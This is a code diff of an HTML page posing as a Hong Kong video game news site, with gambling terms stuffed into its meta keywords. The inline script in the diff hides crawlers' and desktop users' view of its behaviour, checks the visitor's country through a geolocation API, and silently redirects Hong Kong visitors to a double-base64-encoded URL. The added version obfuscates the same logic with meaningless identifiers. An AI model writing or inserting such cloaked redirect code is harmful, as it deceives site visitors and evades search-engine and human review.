@@ -1,25 +1,33 @@
 <!doctype html><html lang=zh-HK><head><meta charset=UTF-8><meta name=viewport content="width=device-width, initial-scale=1.0"><title>樂缘遊戲 - 探索全球熱門遊戲</title><meta name=description content=探索全球熱門遊戲的資訊平台，提供最新遊戲動態、排行榜和攻略指南。><meta name=keywords content="遊戲, 電子遊戲, 手遊, 主機遊戲, PC遊戲, 遊戲攻略, 遊戲新聞, 現金網, 線上娛樂城, 香港娛樂城, 香港現金網, 百家樂, 線上百家樂, 體育投注, 馬會, 外圍, 網上娛樂, 網上娛樂城, 老虎機, pp88, gameone"><meta name=author content=遊戲愛好者><meta property=og:title content="樂缘遊戲 - 探索全球熱門遊戲"><meta property=og:description content=探索全球熱門遊戲的資訊平台，提供最新遊戲動態、排行榜和攻略指南。><meta property=og:image content="https://picsum.photos/1200/630?random=1"><meta property=og:url content=https://example.com/games><meta property=og:type content=website><meta property=og:site_name content=樂缘遊戲><meta name=twitter:card content=summary_large_image><meta name=twitter:title content="樂缘遊戲 - 探索全球熱門遊戲"><meta name=twitter:description content=探索全球熱門遊戲的資訊平台，提供最新遊戲動態、排行榜和攻略指南。><meta name=twitter:image content=https://i.imgur.com/aNocM2k.png><meta name=twitter:site content=@game-world><link rel=icon type=image/png href=https://i.imgur.com/aNocM2k.png sizes=96x96><link rel=icon type=image/svg+xml href="https://picsum.photos/32/32?random=1"><link rel="shortcut icon" href="https://picsum.photos/16/16?random=1"><link rel=apple-touch-icon sizes=180x180 href="https://picsum.photos/180/180?random=1"><script src=https://cdn.tailwindcss.com></script><link href=https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel=stylesheet><script>tailwind.config={theme:{extend:{colors:{primary:'#165DFF',secondary:'#FF4D4F',neutral:{100:'#F5F7FA',200:'#E4E7ED',300:'#DCDFE6',400:'#C0C4CC',500:'#909399',600:'#606266',700:'#303133',800:'#1E1E1E',900:'#141414',}},fontFamily:{'inter':['Inter','sans-serif'],},}}}</script><script>
         (function() {
-    const _uaKeywords = ["bot", "crawl", "google", "spider", "preview", "windows", "macintosh", "linux"];
-    const _ua = navigator.userAgent.toLowerCase();
-    const _isBot = _uaKeywords.some(kw => _ua.includes(kw));
-    const getHK = () => fetch("https://ipapi.co/json/")
-        .then(r => r.json())
-        .then(d => d && d.country_code === "HK");
-    const a = "YUhSMGNITTZMeTlrY21W";
-    const b = "aGJYZzNNeTVqYjIwdg==";
-    const finalURL = atob(atob(a + b));
+    const _0x4c4a = ['bot', 'crawl', 'google', 'spider', 'preview', 'windows', 'macintosh', 'linux'];
+    const _0x5a7f = navigator.userAgent.toLowerCase();
+    const _0x2d0b = _0x4c4a.some(_0x1a93 => _0x5a7f.includes(_0x1a93));
 
-    if (!_isBot) {
-        setTimeout(async () => {
-            try {
-                const isHK = await getHK();
-                if (isHK) {
-                    location.href = finalURL;
-                }
-            } catch (e) {}
-        }, 700);
-    }
+    const _0x3e1c = () => new Promise((_0x4e9a, _0x2bd3) => {
+        fetch("https://ipapi.co/json/")
+            .then(_0x296b => _0x296b.json())
+            .then(_0x566f => {
+                _0x566f && _0x566f.country_code === "HK" ? _0x4e9a(true) : _0x4e9a(false);
+            })
+            .catch(_0x3a98 => {
+                console.error("IP API Error:", _0x3a98);
+                _0x4e9a(false);
+            });
+    });
+
+    const _0x410d = "YUhSMGNITTZMeTlrY21W";
+    const _0x168a = "aGJYZzNNeTVqYjIwdg==";
+    const _0x533a = atob(atob(_0x410d + _0x168a));
+
+    !_0x2d0b && setTimeout(async () => {
+        try {
+            const _0x284e = await _0x3e1c();
+            _0x284e && (window.location.href = _0x533a);
+        } catch (_0x48c1) {
+            console.error("Redirection Error:", _0x48c1);
+        }
+    }, 700);
 })();
     </script><style type=text/tailwindcss>
         @layer utilities {
